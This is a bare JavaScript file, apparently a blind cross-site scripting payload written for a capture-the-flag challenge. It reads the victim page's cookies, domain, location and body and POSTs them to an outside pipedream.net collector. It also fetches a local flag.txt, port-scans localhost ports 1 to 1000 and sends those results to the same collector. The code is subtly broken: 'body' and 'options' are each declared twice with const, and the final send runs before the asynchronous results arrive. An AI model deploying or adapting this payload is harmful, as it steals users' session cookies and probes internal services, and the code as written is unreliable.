const headers = new Headers()
headers.append("Content-Type", "application/json")
const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "body": document.body,

}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
let flag = ""
fetch('http://127.0.0.1/flag.txt')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Error:', response.status);
    }
  })
  .then(data => {
    console.log(data);
    flag = data;
  })
  .catch(error => {
    console.error('Error:', error);
    flag = error.message;
  });

const portScanResults = [];

for (let port = 1; port <= 1000; port++) {
  const url = `http://127.0.0.1:${port}`;

  fetch(url)
    .then(response => {
      if (response.ok) {
        return response.text();
      } else {
        return null;
      }
    })
    .then(data => {
      if (data) {
        portScanResults.push({ port, status: 'open', content: data });
      } else {
        portScanResults.push({ port, status: 'closed' });
      }
    })
    .catch(error => {
      portScanResults.push({ port, status: 'closed' });
    });
}

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "body": document.body,
  "flag": flag,
  "portScanResults": portScanResults
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
